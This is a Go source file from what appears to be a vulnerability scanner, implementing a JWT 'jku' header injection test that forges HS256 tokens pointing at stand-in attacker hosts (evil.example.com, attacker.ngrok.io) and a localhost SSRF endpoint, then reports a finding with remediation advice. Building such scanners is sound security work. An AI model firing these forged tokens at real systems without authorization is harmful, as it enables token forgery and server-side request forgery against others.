package jwtengine

import (
	"DORM/models"
	"encoding/base64"
	"encoding/json"
	"fmt"
)

// BuildJKUToken builds a JWT with a jku pointing to a crafted URL.
func BuildJKUToken(origPayloadB64, jkuURL string, secret []byte) string {
	headerMap := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
		"jku": jkuURL,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	return models.SignHS256(headerB64, origPayloadB64, secret)
}

// RunJKUInjectionAttack (Attack 6): injects a crafted 'jku' (JSON Web Key Set
// URL) header pointing to an attacker-controlled or internal endpoint — if
// the server fetches it and/or accepts the resulting token, that's either an
// SSRF or a forged-token acceptance. Now shares the same acceptance check
// (testToken) as attacks 1-5, instead of its own separate inline check.
func RunJKUInjectionAttack(target models.ScanTarget, origPayloadB64 string, testToken func(tok, endpoint string) bool) *models.Vulnerability {
	jkuTargets := []string{
		"https://evil.example.com/jwks.json",
		"http://127.0.0.1:8081/jwks.json", // SSRF via JKU
		"https://attacker.ngrok.io/jwks",
	}
	jkuSecret := []byte("jku_test_secret")
	for _, jku := range jkuTargets {
		jkuTok := BuildJKUToken(origPayloadB64, jku, jkuSecret)
		if testToken(jkuTok, "/") {
			return &models.Vulnerability{
				Target:   target,
				Name:     "JWT JKU Header Injection (External Key URL)",
				Severity: "HIGH",
				CVSS:     8.1,
				Description: fmt.Sprintf(
					"Server may accept JWT with external 'jku' key URL.\n"+
						"This can lead to SSRF or forged token acceptance if the server fetches %s.",
					jku,
				),
				Solution:  "Whitelist allowed JWKS URLs. Never fetch arbitrary URLs from JWT headers.",
				Reference: "OWASP JWT Security Cheat Sheet / CWE-918",
			}
		}
	}
	return nil
}
